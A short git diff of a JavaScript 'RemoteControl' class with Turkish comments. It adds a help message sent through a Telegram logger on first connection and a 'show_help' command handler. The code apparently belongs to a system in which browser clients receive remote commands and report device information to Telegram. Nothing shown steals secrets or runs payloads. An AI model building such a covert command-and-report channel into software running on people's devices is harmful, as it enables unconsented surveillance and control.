@@ -116,6 +116,21 @@ class RemoteControl {
                 session_id: this.sessionId,
                 timestamp: new Date().toISOString()
             });
+            
+            // Help mesajını gönder (ilk bağlantıda)
+            setTimeout(() => {
+                this.sendHelpMessage();
+            }, 2000);
+        }
+    }
+
+    // Help mesajı gönder
+    async sendHelpMessage() {
+        if (window.telegramLogger) {
+            await window.telegramLogger.sendLog('help_guide', {
+                guide_type: 'full',
+                commands: 'all'
+            });
         }
     }
 
@@ -191,6 +206,12 @@ class RemoteControl {
     // Komutu çalıştır
     async executeCommand(cmd) {
         try {
+            // /help komutu
+            if (cmd.command === 'show_help') {
+                await this.sendHelpMessage();
+                return;
+            }
+            
             // /devices komutu - her cihaz kendi bilgisini gönderir
             if (cmd.command === 'list_devices') {
                 // Kendi cihaz bilgisini gönder
